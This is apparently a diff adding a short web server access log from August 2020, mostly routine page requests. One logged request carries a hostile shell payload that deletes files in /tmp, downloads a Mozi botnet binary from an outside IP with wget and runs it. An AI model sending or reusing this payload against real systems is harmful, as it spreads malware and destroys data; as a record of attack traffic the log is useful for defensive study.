@@ -1,0 +1,8 @@
+- - [08/Aug/2020:12:09:24 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
+- - [08/Aug/2020:12:09:28 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
+- - [08/Aug/2020:19:00:50 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://176.221.220.181:45765/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 1872 "-" - "Hello, world"
+- - [08/Aug/2020:23:00:02 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
+- - [08/Aug/2020:23:27:11 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+- - [09/Aug/2020:03:23:22 +0000] "GET / HTTP/1.1" 200 4026 "-" - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
+- - [09/Aug/2020:05:44:38 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+- - [09/Aug/2020:06:06:55 +0000] "GET / HTTP/1.1" 200 2387 "-" - "-"
